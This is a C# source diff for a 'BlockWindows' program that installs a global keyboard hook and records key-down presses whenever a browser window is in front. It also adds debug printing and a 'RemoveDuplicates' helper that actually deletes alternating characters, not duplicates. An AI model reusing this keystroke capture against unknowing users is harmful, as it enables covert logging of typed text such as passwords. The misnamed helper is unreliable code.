@@ -217,6 +217,22 @@ class BlockWindows
             }
         }
 
+        public void RemoveDuplicates()
+        {
+            _message = KeyMessage.RemoveDuplicates(_message);
+        }
+        public static string RemoveDuplicates(string str)
+        {
+            StringBuilder b = new StringBuilder(str);
+            for (var i = 1; i < b.Length - 1; i += 2)
+            {
+
+                b = b.Remove(i - 1, 1);
+            }
+
+            return b.ToString();
+        }
+
         public void AddChar(char c)
         {
             _message += c;
@@ -226,7 +242,7 @@ class BlockWindows
         {
             IntPtr fore = WinApi.GetForegroundWindow();
             uint tpid = WinApi.GetWindowThreadProcessId(fore, IntPtr.Zero);
-            byte [] keys = new byte[256];
+            byte[] keys = new byte[256];
             StringBuilder b = new StringBuilder(100);
             IntPtr hKL = WinApi.GetKeyboardLayout(tpid);
             hKL = (IntPtr)(hKL.ToInt32() & 0x0000FFFF);
@@ -240,7 +256,7 @@ class BlockWindows
                     0,
                     hKL
                 );
-//            Console.WriteLine(b.ToString());
+            //            Console.WriteLine(b.ToString());
 
             _message += b.ToString();
         }
@@ -253,6 +269,14 @@ class BlockWindows
     static Timer t = new Timer();
     public static void Main()
     {
+        Console.WriteLine(KeyMessage.RemoveDuplicates("aaa"));
+        Console.WriteLine(KeyMessage.RemoveDuplicates("aaaaaaasdfaa"));
+        Console.WriteLine(KeyMessage.RemoveDuplicates("aaaaaaaasafd"));
+        Console.WriteLine(KeyMessage.RemoveDuplicates("aaaaaaaf"));
+        Console.WriteLine(KeyMessage.RemoveDuplicates("aaaaasdaaa"));
+        Console.WriteLine(KeyMessage.RemoveDuplicates("aaaaaaaASDF"));
+        Console.WriteLine(KeyMessage.RemoveDuplicates("aaaaaaaDFASDF"));
+        Console.WriteLine(KeyMessage.RemoveDuplicates("aaaaaaabbbbbb"));
         keyBoardHook = SetKeyBoardHook();
         ApplicationContext ctx = new ApplicationContext();
         ctx.ThreadExit += delegate(object sender, EventArgs e)
@@ -311,17 +335,17 @@ class BlockWindows
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
     {
-        if (IsBrowser(GetForeWindowTitle()))
+        if (IsBrowser(GetForeWindowTitle())  && (wParam == (IntPtr)WinApi.WM_KEYDOWN))
         {
             int code = Marshal.ReadInt32(lParam);
             Keys pressedKey = (Keys)code;
 
             char symbol = pressedKey.ToString()[0];
-            Console.WriteLine(CurrentCulture.Name);
+
             Message.AddChar(pressedKey);
-
+            Console.WriteLine(Message.Message);
+            Console.WriteLine(WinApi.GetAsyncKeyState(pressedKey));
             t.Stop();
-
             t.Start();//restart timer
         }
 
